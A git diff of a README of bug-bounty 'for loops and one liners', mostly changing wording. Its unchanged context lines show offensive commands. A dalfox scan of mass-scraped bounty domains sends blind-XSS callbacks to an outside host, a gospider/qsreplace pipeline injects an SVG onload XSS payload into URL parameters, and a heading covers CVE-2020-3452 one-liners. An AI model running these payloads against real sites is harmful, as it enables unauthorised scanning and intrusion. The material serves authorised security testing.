@@ -1,5 +1,5 @@
 # For loops and one liners for bug bounty 
-Credits goes to all those awesome researchers who uploaded these on Twitter and their GitHub  
+Credits goes to all those awesome researchers who uploaded these on Twitter and GitHub  
 
 Please Note: Kindly use this only for reference and learning purposes using this doesn't means that you will find Vulnerabilities cause everybody is using this so try to be creative while using it and modify them to get unique results :)
 
@@ -30,13 +30,13 @@ gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; | subfinder -dL domains.txt | httpx -silent -threads 500 | tee -a subdomains.txt | dalfox file subdomains.txt -b your.xss.ht pipe
 
 ```
-### Using Kxss for finding xss issues
+### Using Kxss for finding xss 
 
 ```bash
 cat http://subdomains.txt | waybackurls | kxss
 ```
 
-### Using Gospider with qsReplace
+### Using Gospider with qsreplace
 
 ```bash
 gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg/onload=confirm(1);>'
@@ -162,14 +162,11 @@ subfinder -d $1 -silent -t 100 | httprobe -c 50 | sort -u | while read line; do 
 
 ```bash
 gau http://hacked-site.com | waybackurls | grep ".xlsx"
+
 ```
 
 
-
-
-
-
-## One Liners for CVE and Vulnerabilties
+## One Liners for CVE and and other Vulnerabilties
 
 ### To find CVE 2020-3452 
 
